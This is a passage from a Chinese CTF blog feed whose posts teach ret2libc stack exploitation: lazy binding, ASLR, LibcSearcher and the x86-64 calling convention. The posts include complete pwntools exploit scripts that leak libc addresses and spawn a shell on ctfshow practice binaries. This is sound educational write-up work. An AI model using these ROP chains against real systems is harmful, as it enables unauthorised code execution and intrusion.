&lt;h1 id=&quot;ctfshow-pwn47（32位）&quot;&gt;&lt;a href=&quot;#ctfshow</summary>
      
    
    
    
    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="ret2libc" scheme="https://jiutian521.github.io/tags/ret2libc/"/>
    
  </entry>
  
  <entry>
    <title>ret2libc进阶</title>
    <link href="https://jiutian521.github.io/posts/b2cf9080.html"/>
    <id>https://jiutian521.github.io/posts/b2cf9080.html</id>
    <published>2025-11-16T16:00:00.000Z</published>
    <updated>2025-11-25T00:30:54.866Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前置知识点"><a href="#前置知识点" class="headerlink" title="前置知识点"></a>前置知识点</h1><p>实际上，在之前的ret2libc题目中，我们还没有接触到ret2libc的核心，因为plt表里是存在现成的system的，但是大多数题目中，根本就没有出现或者引用过system函数，即使动态表里有system函数，程序也不会建立对应的plt表</p><p>因此，我们必须要知道system函数的地址，即进行经典的泄露libc的操作，这对于我们对ROP链的使用要求又上了一个台阶，因此我个人认为这一块到了pwn里真正开始上难度的地方了</p><p>在开始之前，我们必须要知道几个前置知识点，每一块想要掌握都需要费一番功夫</p><h2 id="延迟绑定机制"><a href="#延迟绑定机制" class="headerlink" title="延迟绑定机制"></a>延迟绑定机制</h2><p>我们知道，在动态链接时，我们需要从动态链接库链接外部函数，那么这个链接外部函数的过程是怎么样的呢</p><p>实际上，程序在第一次调用某个外部函数前，程序是不知道这个函数的具体位置的，也只有在第一次调用时，它才会去找这个函数在libc里的真实地址</p><p>每次执行 func@plt 时，程序首先执行 jmp [got.func]，即jmp到got表里对应函数的地址，接下来程序会做一个判断：</p><blockquote><p>如果 GOT 中记录的是跳板地址（还没有被解析），也就是ida里看到的offset func地址，则会 push index 后跳到 plt[0]，plt[0]是所有函数第一次被调用时的公共入口，从这里开始解析函数地址，plt[0]调用动态链接器ld.so，开始查找该函数在libc的真实地址，把真实地址写入GOT表，后续可以直接从got表里调用，不用再经过复杂的plt表解析函数地址</p></blockquote><blockquote><p>如果 GOT 中记录的是真实函数地址（解析完成），就直接跳过去调用真实函数</p></blockquote><p>我们需要重点了解第一种情况，即函数第一次被调用的过程</p><p>实际上，第一次借助plt表寻找函数的真实地址是一个相对复杂的过程，我只解释到表面的过程，底层的原理这个博主讲的很详细</p><blockquote><p><a href="https://starrysky1004.github.io/2024/09/26/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/">https://starrysky1004.github.io/2024/09/26/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/</a></p></blockquote><h2 id="ALSR技术"><a href="#ALSR技术" class="headerlink" title="ALSR技术"></a>ALSR技术</h2><blockquote><p>在 Linux 系统中，栈随机化已经变成了标准行为。 它是更大的一类技术中的一种，这<br>类技术称为地址空间布局随机化(Address-Space Layout Randomization), 或者简称 ASLR<br> [99] 。采用 ASLR, 每次运行时程序的不同部分，包括程序代码、库代码、栈、 全局变最<br>和堆数据，都会被加载到内存的不同区域。 这就意味着在一台机器上运行一个程序，与在<br>其他机器上运行同样的程序，它们的地址映射大相径庭。这样才能够对抗一些形式的<br>攻击</p></blockquote><p>以上出自《CSAPP》3.10.4 对抗缓冲区溢出攻击</p><p>在现代 Linux 系统中，ASLR 通常是全局开启的</p><h2 id="PIE保护和ASLR技术的关系"><a href="#PIE保护和ASLR技术的关系" class="headerlink" title="PIE保护和ASLR技术的关系"></a>PIE保护和ASLR技术的关系</h2><p>如果程序没有开启 PIE，即使 ASLR 开启，攻击者仍然可以利用固定的代码地址来构造 ROP 链（因为代码基址不变）</p><p>只有当 PIE 和 ASLR 同时开启时，一个进程的所有关键内存区域（代码、全局数据、栈、堆、动态链接库）的地址才会全部被随机化，使得攻击者难以预测任何地址</p><p>以下的题目PIE保护全都是关的，所以正如上所说，我们可以用基址和偏移去计算，有公式：</p><blockquote><p>真实地址 &#x3D; 基址 + 偏移</p></blockquote><p>我们一个个来看，实际上，ASLR导致了libc的基址是随机的，这就需要我们自己泄露。我们知道，got表里存放着函数的真实地址，因此，我们可以在got表找出某一个函数func1，打印其地址，就得到了该函数的真实地址</p><p>我们需要知道，每个版本的libc库，函数地址的偏移量是固定的，换句话说，我们需要知道我们的程序调用的是哪个版本的libc库，从而知道不同函数对应的偏移量</p><p>我们用打印出的func1的真实地址减去偏移量，就能得到libc的基址，然后加上对应函数（如system函数）的偏移，就可以得到该函数的真实地址了</p><h2 id="手动计算"><a href="#手动计算" class="headerlink" title="手动计算"></a>手动计算</h2><p>这种情况适用于题目给了libc.so.6和ld-linux-x86-64.so.2文件，目前我还没有遇到过这种题，因此暂时按下不表</p><h2 id="LibcSearcher的使用"><a href="#LibcSearcher的使用" class="headerlink" title="LibcSearcher的使用"></a>LibcSearcher的使用</h2><p>如果题目只给了一个ELF二进制文件，那么我们可以用LibcSearcher去查找使用的libc库</p><p>首先讲讲它的工作原理，一般来说，libc的基址以0xf7开头</p><p>LibcSearcher内置了大量 libc 的函数偏移数据库，它通过泄露的实际地址减去偏移反推 libc 基址，再通过不断尝试，匹配出最可能的libc，也就是0xf7开头的，如果我们泄露多个函数时，它会交叉过滤，最终锁定正确的libc版本，将该版本的libc偏移量返回给我们</p><h1 id="exp鉴赏"><a href="#exp鉴赏" class="headerlink" title="exp鉴赏"></a>exp鉴赏</h1><p>因为本篇ret2libc进阶的内容非常重要，也是最常考的，为了能够快速上手并且深刻理解，我先分析一下一些比较经典的exp，我认为看的多了，写的时候就有思路了</p><p>当然说这些还是纸上谈兵，后面实战演练时我们会在靶场打一打</p><h2 id="eg1：ctfwiki-基本ROP-ret2libc3"><a href="#eg1：ctfwiki-基本ROP-ret2libc3" class="headerlink" title="eg1：ctfwiki 基本ROP ret2libc3"></a>eg1：ctfwiki 基本ROP ret2libc3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s[100]; // [esp+1Ch] [ebp-64h] BYREF</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  puts(&quot;No surprise anymore, system disappeard QQ.&quot;);</span><br><span class="line">  printf(&quot;Can you find it !?&quot;);</span><br><span class="line">  gets(s);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">sh = process(&#x27;./ret2libc3&#x27;)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(&#x27;./ret2libc3&#x27;)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[&#x27;puts&#x27;]</span><br><span class="line">libc_start_main_got = ret2libc3.got[&#x27;__libc_start_main&#x27;]</span><br><span class="line">main = ret2libc3.symbols[&#x27;main&#x27;]</span><br><span class="line">#__libc_start_main这个函数比较特别</span><br><span class="line">#使用它是因为它在所有ELF中都存在，偏移稳定，最容易唯一匹配libc</span><br><span class="line">#并且LibcSearcher里通常会有这个函数</span><br><span class="line"></span><br><span class="line">print(&quot;leak libc_start_main_got addr and return to main again&quot;)</span><br><span class="line">#开始第一阶段泄露</span><br><span class="line"></span><br><span class="line">payload = flat([b&#x27;A&#x27; * 112, puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(b&#x27;Can you find it !?&#x27;, payload)</span><br><span class="line">#[A填充 112字节]</span><br><span class="line">#return address = puts@plt</span><br><span class="line">#next return = main</span><br><span class="line">#参数 = libc_start_main@got</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(&quot;get the related addr&quot;)</span><br><span class="line">libc_start_main_addr = u32(sh.recv(4))</span><br><span class="line">#接收泄露出的地址</span><br><span class="line">#接收前四个字节，u32按照小端序，打印成整数</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)</span><br><span class="line">#libc基址＝libc_start_main地址-libc_start_main的偏移</span><br><span class="line"></span><br><span class="line">system_addr = libcbase + libc.dump(&#x27;system&#x27;)</span><br><span class="line">binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">#计算system和bin/sh的实际地址</span><br><span class="line"></span><br><span class="line">print(&quot;get shell&quot;)</span><br><span class="line">payload = flat([b&#x27;A&#x27; * 104, system_addr, 0xdeadbeef, binsh_addr])</span><br><span class="line">#其实我也没看明白为什么偏移量和第一次的不一样</span><br><span class="line">#AI的解释是我们是通过puts ret到的main，并不是正常返回</span><br><span class="line">#因此少了puts 的 saved EBP + ret共8个字节</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-17_21-58-48.3k8ft0q3ix.webp"></p><h1 id="32位系统-无system无bin-sh字符串"><a href="#32位系统-无system无bin-sh字符串" class="headerlink" title="32位系统 无system无bin&#x2F;sh字符串"></a>32位系统 无system无bin&#x2F;sh字符串</h1><h2 id="eg1：ctfshow-pwn45"><a href="#eg1：ctfshow-pwn45" class="headerlink" title="eg1：ctfshow pwn45"></a>eg1：ctfshow pwn45</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  init(&amp;argc);</span><br><span class="line">  logo();</span><br><span class="line">  puts(&quot;O.o?&quot;);</span><br><span class="line">  ctfshow();</span><br><span class="line">  write(0, &quot;Hello CTFshow!\n&quot;, 0xEu);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t ctfshow()</span><br><span class="line">&#123;</span><br><span class="line">  char buf[103]; // [esp+Dh] [ebp-6Bh] BYREF</span><br><span class="line"></span><br><span class="line">  return read(0, buf, 0xC8u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-18_14-40-13.5trgdi2oyw.webp"></p><p>我们本地启动简单看一下，实际上程序并不复杂，输出了字符串O.o?后让我们输入</p><p>左侧函数窗口函数不多，可以肯定是动态链接<br><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-18_14-51-09.2kscgutz3g.webp"></p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-18_14-53-13.3yevkw6vo4.webp"></p><p>我们重点看一下我框起来的，粉色区域加粗的函数说明是从外部的libc库中调用的，这是我们重点关注对象</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-18_14-50-54.pfro8hjho.webp"></p><p>在got表里看一下，确实是这五个函数。这里要注意我们的got表在ida里是.got.plt表，不是.plt.got表，后者没什么用</p><p>我们用libcsearcher需要提供任意一个函数就可以了，我这里随便选一个libc_start_main_</p><p>下面展示一下我根据ctfwiki改编的exp，无AI。每一段我之前已经解读过了，就不再解读了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.binary = &#x27;./pwn&#x27;</span><br><span class="line"></span><br><span class="line">#sh = process(&#x27;./pwn&#x27;)</span><br><span class="line">sh = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28144)</span><br><span class="line">pwn = ELF(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">puts_plt = pwn.plt[&#x27;puts&#x27;]</span><br><span class="line">libc_start_main_got = pwn.got[&#x27;__libc_start_main&#x27;]</span><br><span class="line">main = pwn.symbols[&#x27;main&#x27;]</span><br><span class="line"></span><br><span class="line">print(&quot;leak libc_start_main_got addr and return to main again&quot;)</span><br><span class="line">payload = flat([b&#x27;A&#x27; * (0x6B+0x4), puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(b&#x27;O.o?&#x27;, payload)</span><br><span class="line"></span><br><span class="line">print(&quot;get the related addr&quot;)</span><br><span class="line">libc_start_main_addr =u32(sh.recvuntil(b&#x27;\xf7&#x27;)[-4:])</span><br><span class="line">libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)</span><br><span class="line">system_addr = libcbase + libc.dump(&#x27;system&#x27;)</span><br><span class="line">binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">print(&quot;get shell&quot;)</span><br><span class="line">payload = flat([b&#x27;A&#x27; *(0x6B+0x4) , system_addr, 0xdeadbeef, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-18_15-06-34.7ppzo05lx.webp"></p><p>打通后，libcsearcher匹配到了两个可能的libc版本，我们输入0或者1挨个试一下就可以了，这里用第二个版本打通了</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-18_15-07-18.70arm4qd0m.webp"></p><h1 id="64位系统-无system无bin-sh字符串"><a href="#64位系统-无system无bin-sh字符串" class="headerlink" title="64位系统 无system无bin&#x2F;sh字符串"></a>64位系统 无system无bin&#x2F;sh字符串</h1><h2 id="eg2：ctfshow-pwn46"><a href="#eg2：ctfshow-pwn46" class="headerlink" title="eg2：ctfshow pwn46"></a>eg2：ctfshow pwn46</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  logo();</span><br><span class="line">  puts(&quot;O.o?&quot;);</span><br><span class="line">  ctfshow();</span><br><span class="line">  write(0, &quot;Hello CTFshow!\n&quot;, 0xEuLL);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t ctfshow()</span><br><span class="line">&#123;</span><br><span class="line">  char buf[112]; // [rsp+0h] [rbp-70h] BYREF</span><br><span class="line"></span><br><span class="line">  return read(0, buf, 0xC8uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序和上一题没什么太大区别，具体我不细贴了，我们直接看一下我的exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.binary = &#x27;./pwn&#x27;</span><br><span class="line"></span><br><span class="line">#sh = process(&#x27;./pwn&#x27;)</span><br><span class="line">sh = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28280)</span><br><span class="line">pwn = ELF(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">puts_plt = pwn.plt[&#x27;puts&#x27;]</span><br><span class="line">libc_start_main_got = pwn.got[&#x27;__libc_start_main&#x27;]</span><br><span class="line">main = pwn.symbols[&#x27;main&#x27;]</span><br><span class="line"></span><br><span class="line">#以上套模板照抄</span><br><span class="line"></span><br><span class="line">offset = 0x70 + 0x8</span><br><span class="line">ret_addr = 0x4004fe</span><br><span class="line">pop_rdi_addr = 0x400803</span><br><span class="line"></span><br><span class="line">#ROPgadget算一下</span><br><span class="line"></span><br><span class="line">print(&quot;leak libc_start_main_got addr and return to main again&quot;)</span><br><span class="line">payload = b&#x27;A&#x27; * (0x70+0x8)</span><br><span class="line">payload += p64(pop_rdi_addr)</span><br><span class="line">payload += p64(libc_start_main_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line">sh.sendlineafter(b&#x27;O.o?&#x27;, payload)</span><br><span class="line"></span><br><span class="line">print(&quot;get the related addr&quot;)</span><br><span class="line">libc_start_main_addr =u64(sh.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">#注意接收libc地址的方式不同</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)</span><br><span class="line">system_addr = libcbase + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">#以上计算过程套模板照抄</span><br><span class="line"></span><br><span class="line">print(&quot;get shell&quot;)</span><br><span class="line">payload = b&#x27;a&#x27;*(0x70+0x8)</span><br><span class="line">payload += p64(pop_rdi_addr) #pop rdi</span><br><span class="line">payload += p64(bin_sh_addr) #bin/sh</span><br><span class="line">payload += p64(ret_addr) #ret</span><br><span class="line">payload += p64(system_addr) #system</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-18_17-56-33.4joj7dl8bd.webp"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="32位和64位exp的对比"><a href="#32位和64位exp的对比" class="headerlink" title="32位和64位exp的对比"></a>32位和64位exp的对比</h2><p>相比于32位的exp，64位的exp有如下改动：</p><p>1.libc_start_main_addr &#x3D;u64(sh.recvuntil(b’\x7f’)[-6:].ljust(8, b’\x00’))</p><p>2.两段payload不同</p><p>32位payload1：调用puts，设置返回地址为main，设置puts参数为libc函数</p><p>64位payload2：pop rdi寄存器，将libc参数放进rdi寄存器，调用puts函数，返回地址为main</p><p>32位payload2：覆盖返回地址为system，设置system返回地址为虚假地址，设置system参数为bin&#x2F;sh</p><p>64位payload2：pop rdi寄存器，将libc参数放入rdi寄存器，ret保证栈堆平衡，调用system函数</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>这篇博客是我目前为用时最久的一篇，exp没有依靠也依靠不了AI编写，仅用了AI讲解基础知识点，自己做出来的时候还是挺高兴的</p><p>可以说从这里开始，我们对ROP链的使用更上了一个台阶。可以看到，无system的题型虽然比有system的题型考的多也考的难，比如我们第一次用了两次payload。但是，这些依然离不开之前的基础，重点还是要理解32位和64位的传参方式及其区别，以及函数调用约定，栈是如何分布和增长的等。不可否认做题可以套模板，但是套模板的同时一定要做到理解背后的原理，清楚的知道自己每一步在干什么，而不是生搬硬套，这样就失去了做题的意义了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前置知识点&quot;&gt;&lt;a href=&quot;#前置知识点&quot; class=&quot;headerlink&quot; title=&quot;前置知识点&quot;&gt;&lt;/a&gt;前置知识点&lt;/h1&gt;&lt;p&gt;实际上，在之前的ret2libc题目中，我们还没有接触到ret2libc的核心，因为plt表里是存在现成的syste</summary>
      
    
    
    
    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="ret2libc" scheme="https://jiutian521.github.io/tags/ret2libc/"/>
    
  </entry>
  
  <entry>
    <title>初识64位下的ret2libc</title>
    <link href="https://jiutian521.github.io/posts/3f2930dc.html"/>
    <id>https://jiutian521.github.io/posts/3f2930dc.html</id>
    <published>2025-11-12T16:00:00.000Z</published>
    <updated>2025-11-18T13:22:54.268Z</updated>
    
    <content type="html"><![CDATA[<p>写在前面：这种类型的题其实不好归纳是ret2text还是ret2libc，我这里按照ctfwiki的分类方法，将存在完整可执行的system(bin&#x2F;sh)后门函数的题型归纳为ret2text，将需要利用基本的ROP技术的题型归纳位ret2libc</p><p>我们知道，在32位系统下，参数是直接被放在栈上的，不需要寄存器，因此只需要简单的覆盖到后门函数地址即可，但是在64位系统下则不一样了</p><h1 id="64位系统的函数调用约定"><a href="#64位系统的函数调用约定" class="headerlink" title="64位系统的函数调用约定"></a>64位系统的函数调用约定</h1><p>linux下64位系统采用System V AMD64调用约定，这里我会在阅读完CSAPP第三章后做更加详细的解释，下面是一些简要解释</p><h2 id="参数传递方式"><a href="#参数传递方式" class="headerlink" title="参数传递方式"></a>参数传递方式</h2><table><thead><tr><th>参数编号</th><th>寄存器</th></tr></thead><tbody><tr><td>第 1 个</td><td>RDI</td></tr><tr><td>第 2 个</td><td>RSI</td></tr><tr><td>第 3 个</td><td>RDX</td></tr><tr><td>第 4 个</td><td>RCX</td></tr><tr><td>第 5 个</td><td>R8</td></tr><tr><td>第 6 个</td><td>R9</td></tr></tbody></table><p>函数的前六个参数从右往左先被存入寄存器，再通过call调用函数</p><blockquote><p>foo(1, 2, 3, 4, 5, 6, 7);</p></blockquote><blockquote><p>mov rdi, 1<br>mov rsi, 2<br>mov rdx, 3<br>mov rcx, 4<br>mov r8,  5<br>mov r9,  6<br>push 7 #第七个参数压入栈<br>call foo</p></blockquote><h1 id="有system函数和bin-sh字符串"><a href="#有system函数和bin-sh字符串" class="headerlink" title="有system函数和bin&#x2F;sh字符串"></a>有system函数和bin&#x2F;sh字符串</h1><h2 id="eg1：ctfshow-pwn40"><a href="#eg1：ctfshow-pwn40" class="headerlink" title="eg1：ctfshow pwn40"></a>eg1：ctfshow pwn40</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  puts(asc_400828);</span><br><span class="line">  puts(asc_4008A0);</span><br><span class="line">  puts(asc_400920);</span><br><span class="line">  puts(asc_4009B0);</span><br><span class="line">  puts(asc_400A40);</span><br><span class="line">  puts(asc_400AC8);</span><br><span class="line">  puts(asc_400B60);</span><br><span class="line">  puts(&quot;    * *************************************                           &quot;);</span><br><span class="line">  puts(aClassifyCtfsho);</span><br><span class="line">  puts(&quot;    * Type  : Stack_Overflow                                          &quot;);</span><br><span class="line">  puts(&quot;    * Site  : https://ctf.show/                                       &quot;);</span><br><span class="line">  puts(&quot;    * Hint  : It has system and &#x27;/bin/sh&#x27;,but they don&#x27;t work together&quot;);</span><br><span class="line">  puts(&quot;    * *************************************                           &quot;);</span><br><span class="line">  puts(&quot;Just easy ret2text&amp;&amp;64bit&quot;);</span><br><span class="line">  ctfshow();</span><br><span class="line">  puts(&quot;\nExit&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t ctfshow()</span><br><span class="line">&#123;</span><br><span class="line">  char buf[10]; // [rsp+6h] [rbp-Ah] BYREF</span><br><span class="line"></span><br><span class="line">  return read(0, buf, 0x32uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ctfshow函数存在明显栈溢出，偏移量为0xA+0x8</p><p>左侧的函数窗口是有system函数的，我们可以看到它在plt表里的地址</p><p>我们找的是plt表的地址，而不是got表，两个地址有一定要区别开</p><p>了解完延迟绑定我回来补充一下：这里got表里的offset system并不是system的真实地址，</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-13_21-56-34.7snmx4nagg.webp"></p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-14_21-59-24.73udejini4.webp"></p><p>shitf加f12查看字符串，存在bin&#x2F;sh字符串<br><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-13_21-59-57.102lao0i3y.webp"></p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-13_22-00-14.5xb24ie9wt.webp"></p><p>下面的是就很简单了，首先是把bin&#x2F;sh字符串传到第一个寄存器rdx里，然后想rdi寄存器指向system函数即可</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-13_23-03-31.86u2o29416.webp"></p><p>用之前讲的ROPgadget指令找到pop rdi</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn --only &quot;pop|ret&quot;|grep rdi</span><br><span 